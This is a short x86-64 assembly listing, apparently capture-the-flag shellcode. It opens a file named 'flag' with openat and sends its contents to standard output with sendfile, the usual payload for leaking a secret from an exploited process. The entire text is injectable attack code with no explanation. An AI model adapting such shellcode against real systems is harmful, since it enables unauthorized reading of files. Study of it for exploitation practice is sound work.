xor rax, rax
mov eax, 0x67616c66
push rax
push rsp

xor rdx, rdx 
mov rsi, [RSP + 0] 
mov rdi, 0x3
mov rax, 0x101
syscall 
add RSP, 16

mov r10, 0xc8
xor rdx, rdx 
mov rsi, 0x4
mov rdi, 0x1
mov rax, 0x28
syscall 

